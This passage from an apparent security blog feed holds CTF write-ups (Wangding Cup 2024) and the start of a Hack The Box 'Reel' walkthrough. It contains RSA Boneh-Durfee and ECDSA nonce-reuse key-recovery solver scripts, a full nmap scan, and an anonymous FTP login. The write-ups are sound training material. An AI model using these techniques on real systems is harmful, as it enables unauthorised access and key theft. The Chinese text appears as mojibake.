<span class="number">1</span> + x * (A + y)  <span class="comment">#ÊûÑÂª∫ÁöÑÊñπÁ®ã</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># Checking bounds</span></span><br><span class="line">            <span class="comment">#if debug:</span></span><br><span class="line">                <span class="comment">#print (&quot;=== Ê†∏ÂØπÊï∞ÊçÆ ===&quot;)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta:&quot;, delta)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of e:&quot;, ceil(log(e)/log(2)))  # eÁöÑbitÊï∞</span></span><br><span class="line">                <span class="comment"># print (&quot;* size of N:&quot;, len(bin(N)))          # NÁöÑbitÊï∞</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of N:&quot;, ceil(log(N)/log(2)))  # NÁöÑbitÊï∞</span></span><br><span class="line">                <span class="comment">#print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># boneh_durfee</span></span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="comment">##print (&quot;=== running algorithm ===&quot;)</span></span><br><span class="line">                start_time = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;=== solution found ===&quot;)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"> </span><br><span class="line">                d_sol = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">                ss=ss+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;pÁöÑÈ´òÊØîÁâπ‰∏∫Ôºö&quot;</span>,l)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;qÁöÑÈ´òÊØîÁâπ‰∏∫Ôºö&quot;</span>,qM)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;d=&quot;</span>,d_sol) </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ss=&quot;</span>,ss)</span><br><span class="line">                            <span class="comment">#end=time.process_time</span></span><br><span class="line">        end=time.clock()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Running time: %s Seconds&#x27;</span>%(end-start))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()  </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180807684-1768989984.png" alt="image-20241030180802109"></p><p>Ë∑ëÁ¨¨‰∫å‰∏™ËÑöÊú¨ÔºåÂæóÂà∞flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180811902-786743954.png" alt="image-20241030180806277"></p><p>wdflag{31998a91-fd51-4df2-864e-73c122786868}</p><h2 id="CRYPTO02-2">CRYPTO02</h2><p>‰∏ãËΩΩÈôÑ‰ª∂ÔºåÊâìÂºÄ‰ª£Á†ÅÔºåÈóÆË±ÜÂåÖ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180817943-2031923977.png" alt="image-20241030180812378"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># È¶ñÂÖàÔºåÊ†πÊçÆÊ§≠ÂúÜÊõ≤Á∫øÁ≠æÂêçÁöÑÊÄßË¥®ÔºåÂà©Áî®ÁªôÂÆöÁöÑr1, s1, z1, r2, s2, z2ÊÅ¢Â§çdA</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"><span class="comment"># Â∑≤Áü•ÁöÑÂèÇÊï∞</span></span><br><span class="line">r1 = <span class="number">66378485426889535028763915423685212583706810153195012097516816885575964878246</span></span><br><span class="line">r2 = <span class="number">66378485426889535028763915423685212583706810153195012097516816885575964878246</span></span><br><span class="line">s1 = <span class="number">73636354334739290806716081380360143742414582638332132893041295586890856253300</span></span><br><span class="line">s2 = <span class="number">64320109990895398581134015047131652648423777800538748939578192006599226954034</span></span><br><span class="line">z1 = <span class="number">35311306706233977395060423051262119784421232920823462737043282589337379493964</span></span><br><span class="line">z2 = <span class="number">101807556569342254666094290602497540565936025601030395061064067677254735341454</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</span></span><br><span class="line">n = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ê†πÊçÆÊ§≠ÂúÜÊõ≤Á∫øÁ≠æÂêçÁöÑÊÅ¢Â§çÂÖ¨Âºè</span></span><br><span class="line"><span class="comment"># s1 * k - z1 = r1 * dA (mod n)</span></span><br><span class="line"><span class="comment"># s2 * k - z2 = r2 * dA (mod n)</span></span><br><span class="line"><span class="comment"># Áî±‰∫ér1 = r2ÔºåÂèØ‰ª•ÈÄöËøáËÅîÁ´ãÊñπÁ®ãÊ±ÇËß£dA</span></span><br><span class="line">k = gmpy2.invert(s1 - s2, n) * (z1 - z2) % n</span><br><span class="line">dA = gmpy2.invert(r1, n) * (s1 * k - z1) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># ‰ΩøÁî®ÊÅ¢Â§çÁöÑdAÁîüÊàêAESÂØÜÈí•</span></span><br><span class="line">key = sha256(long_to_bytes(dA)).digest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Â∑≤Áü•ÁöÑÂä†ÂØÜÂêéÁöÑflagÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤</span></span><br><span class="line">encrypted_flag_hex = <span class="string">&#x27;3cdbe372c9bc279e816336ad69b8247f4ec05647a7e97285dd64136875004b638b77191fe9bef702cb873ee93dbe376c050d0c721b69f17f539cff83372cc37b&#x27;</span></span><br><span class="line">encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ÊèêÂèñIVÂíåÂØÜÊñá</span></span><br><span class="line">iv = encrypted_flag_bytes[:AES.block_size]</span><br><span class="line">ciphertext = encrypted_flag_bytes[AES.block_size:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ÂàõÂª∫AESËß£ÂØÜÂØπË±°</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="comment"># Ëß£ÂØÜ</span></span><br><span class="line">decrypted_data = cipher.decrypt(ciphertext)</span><br><span class="line"><span class="comment"># ÂéªÈô§Â°´ÂÖÖ</span></span><br><span class="line">plaintext = unpad(decrypted_data, AES.block_size)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ÂØπÊõøÊç¢Âä†ÂØÜÁöÑÈÄÜËøáÁ®ãÔºàvictory_encryptÁöÑÈÄÜÔºâ</span></span><br><span class="line">victory_key = <span class="string">&quot;WANGDINGCUP&quot;</span></span><br><span class="line">key_length = <span class="built_in">len</span>(victory_key)</span><br><span class="line">decrypted_text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(plaintext.decode().upper()):</span><br><span class="line">    <span class="keyword">if</span> char.isalpha():</span><br><span class="line">        shift = <span class="built_in">ord</span>(victory_key[i % key_length]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift + <span class="number">26</span>) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">        decrypted_text += decrypted_char</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        decrypted_text += char</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_text)</span><br></pre></td></tr></table></figure><p>ËøêË°åÂêéÊàêÂäüËé∑ÂèñÂà∞flagÔºåË¶ÅËΩ¨Â∞èÂÜô</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180832848-1086515924.png" alt="image-20241030180826831"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180840444-116028875.png" alt="image-20241030180834674"></p><h1>MISC</h1><h2 id="MISC01">MISC01</h2><p>‰∏ãËΩΩÈôÑ‰ª∂ÁúãÈ¢òÁõÆÊèèËø∞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180845157-545941591.png" alt="image-20241030180839581"></p><p>ÊãøwiresharkÁúã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180857245-111451848.png" alt="image-20241030180851376"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180902131-690201118.png" alt="image-20241030180856447"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180906714-779293795.png" alt="image-20241030180900987"></p><p><strong>md5Âä†ÂØÜ</strong></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180910546-2006475635.png" alt="image-20241030180905063"></p><p>ÊúÄÂêéÂæóÂà∞flag</p><p>wdflag{bd9bfee6c7303048dab68cfa6a14b5e7}</p><h2 id="MISC03">MISC03</h2><p>ÊâæÊîªÂáªIP</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180915751-1519011757.png" alt="image-20241030180909859"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180923878-1406315282.png" alt="image-20241030180917812"></p><p>ÊîªÂáªIP‰∏∫Ôºö39.168.5.60</p><h2 id="MISC04">MISC04</h2><p>Áªô‰∫Ü‰∏Ä‰∏™Ëøô‰∏™ÊäΩË±°ÂõæÁâáÔºåËìùÂ∫ïÁ∫¢Á∫øÔºåÂá≠Áõ¥Ëßâ‰∏Ä‰∏™ÊòØÈúÄË¶ÅËøòÂéüÊàê‰∫åÁª¥Á†ÅÁöÑÂΩ¢Âºè</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180936378-958370206.png" alt="image-20241030180930356"></p><p>Ê†πÊçÆÈ¢òÂπ≤Ôºå‰ªñÊòØÊúâ‰∏Ä‰∏™ÂõæÂÉèÂä†ÂØÜÁÆóÊ≥ïÔºåÈúÄË¶ÅÊääËøô‰∏™Á∫¢Á∫øËøòÂéüÈáçÁªÑÊàê‰∫åÁª¥Á†ÅÔºåÊêúÁ¥¢‰∏Ä‰∏™ÊòØËøô‰∏™PeanoÊõ≤Á∫ø</p><p>ÊúÄÁªàÊâæÂà∞‰∫Ü‰∏Ä‰∏™irisctfÁöÑ‰∏ÄÈÅìËµõÈ¢òThe Peano Scramble</p><p><a href="https://almostgph.github.io/2024/01/08/IrisCTF2024/">https://almostgph.github.io/2024/01/08/IrisCTF2024/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">peano</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [[<span class="number">0</span>,<span class="number">0</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        in_lst = peano(n - <span class="number">1</span>)</span><br><span class="line">        lst = in_lst.copy()</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px - i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + <span class="number">1</span> + i[<span class="number">0</span>], py - i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px - i[<span class="number">0</span>], py - <span class="number">1</span> - i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py - <span class="number">1</span> - i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + <span class="number">1</span> + i[<span class="number">0</span>], py + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px - i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        <span class="keyword">return</span> lst</span><br><span class="line"></span><br><span class="line">order = peano(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">r&quot;./1.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">width, height = img.size</span><br><span class="line"></span><br><span class="line">block_width = width <span class="comment"># // 3</span></span><br><span class="line">block_height = height <span class="comment"># // 3</span></span><br><span class="line"></span><br><span class="line">new_image = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, (x, y) <span class="keyword">in</span> tqdm(<span class="built_in">enumerate</span>(order)):</span><br><span class="line">    <span class="comment"># Ê†πÊçÆÂàóË°®È°∫Â∫èËé∑ÂèñÊñ∞ÁöÑÂùêÊ†á</span></span><br><span class="line">    new_x, new_y = i % width, i // width</span><br><span class="line">    <span class="comment"># Ëé∑ÂèñÂéüÂõæÂÉèÁ¥†</span></span><br><span class="line">    pixel = img.getpixel((x, height - <span class="number">1</span> - y))</span><br><span class="line">    <span class="comment"># Âú®Êñ∞ÂõæÂÉè‰∏≠ÊîæÁΩÆÂÉèÁ¥†</span></span><br><span class="line">    new_image.putpixel((new_x, new_y), pixel)</span><br><span class="line"></span><br><span class="line">new_image.save(<span class="string">&quot;rearranged_image.jpg&quot;</span>) </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180947540-1228530137.png" alt="image-20241030180941362"></p><p>Êâ´Á†ÅÂç≥ÂèØ</p>]]></content>
    
    
    <summary type="html">ÁΩëÈºéÊùØ ÈùíÈæôÁªÑ 2024 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://www.fomal.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.fomal.cc/tags/CTF/"/>
    
    <category term="Competition" scheme="https://www.fomal.cc/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Reel</title>
    <link href="https://www.fomal.cc/posts/4097f734.html"/>
    <id>https://www.fomal.cc/posts/4097f734.html</id>
    <published>2024-10-27T05:34:07.000Z</published>
    <updated>2024-10-27T12:37:15.816Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.10.77</p><p>ÊîªÂáªÊú∫ipÔºö10.10.16.4</p></blockquote><h1>Áü•ËØÜÁÇπ</h1><ul><li>RTFÈíìÈ±º</li><li>ACLÊª•Áî®-user-WriteOwnerÊùÉÈôê</li><li>ACLÊª•Áî®-group-WriteDaclÊùÉÈôê</li></ul><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.10.77</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 13:44 CST</span><br><span class="line">Nmap scan report for 10.10.10.77</span><br><span class="line">Host is up (0.76s latency).</span><br><span class="line">Not shown: 65527 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">21/tcp    open  ftp          Microsoft ftpd</span><br><span class="line">| ftp-syst:</span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_05-28-18  11:19PM       &lt;DIR&gt;          documents</span><br><span class="line">22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)</span><br><span class="line">|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)</span><br><span class="line">|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)</span><br><span class="line">25/tcp    open  smtp?</span><br><span class="line">| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP</span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|   Hello:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     EHLO Invalid domain address.</span><br><span class="line">|   Help:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">|   SIPOptions:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|   TerminalServerCookie:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|_    sequence of commands</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49159/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">...</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: specialized</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 7 (85%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Embedded Standard 7 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2012::-</span><br><span class="line">|   Computer name: REEL</span><br><span class="line">|   NetBIOS computer name: REEL\x00</span><br><span class="line">|   Domain name: HTB.LOCAL</span><br><span class="line">|   Forest name: HTB.LOCAL</span><br><span class="line">|   FQDN: REEL.HTB.LOCAL</span><br><span class="line">|_  System time: 2024-10-27T05:48:32+00:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-27T05:48:28</span><br><span class="line">|_  start_date: 2024-10-27T05:35:31</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:0:2:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 2s, deviation: 3s, median: 0s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 445/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   644.73 ms 10.10.16.1</span><br><span class="line">2   961.24 ms 10.10.10.77</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 263.65 seconds</span><br></pre></td></tr></table></figure><p>ÂºÄÊîæ21Ôºå22Ôºå25Á≠âËã•Âπ≤Á´ØÂè£ÔºåÂêåÊó∂ÈÄöËøáËÑöÊú¨Êâ´ÊèèÁªìÊûúÂèØÁü•ÔºåËØ•ÂüüÂêçÊòØ<code>REEL.HTB.LOCAL</code>Âíå<code>HTB.LOCAL</code>ÔºåÂ∞ÜÂÖ∂Ê∑ªÂä†Âà∞<code>/etc/hosts</code>Êñá‰ª∂‰∏≠</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135321701-294670808.png" alt="image-20241027135319436"></p><h2 id="FTP">FTP</h2><p>‰ªéÊâ´ÊèèÁªìÊûúÂèØÁü•ÔºåftpÊòØÂÖÅËÆ∏ÂåøÂêçÁôªÂΩïÁöÑ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp anonymous@10.10.10.77</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135531142-1779717189.png" alt="image-20241027135528981"></p><p>ÂèëÁé∞‰∏â‰∏™Êñá‰ª∂ÔºåÂÖ®ÈÉ®‰∏ãËΩΩ‰∏ãÊù•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prompt off</span><br><span class="line">mget *</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135724047-432466087.png" alt="image-20241027135721726"></p><p>ÂÖ®ÈÉ®Êü•Áúã‰∏Ä‰∏ã</p><ul><li>readme.txt</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135939835-2118791.png" alt="image-20241027135937958"></p><p>ÂèëÁé∞ÊòØË¶Å‰ΩøÁî®ÈÇÆ‰ª∂ÂèëÈÄÅrtfÊ†ºÂºèÁöÑÊñá‰ª∂ÔºåÂπ∂‰∏îÊñáÊ°£ÈÉΩ‰ºö‰øùÂ≠òÂà∞ËøôÈáå</p><ul><li>AppLocker.docx</li></ul><p><img 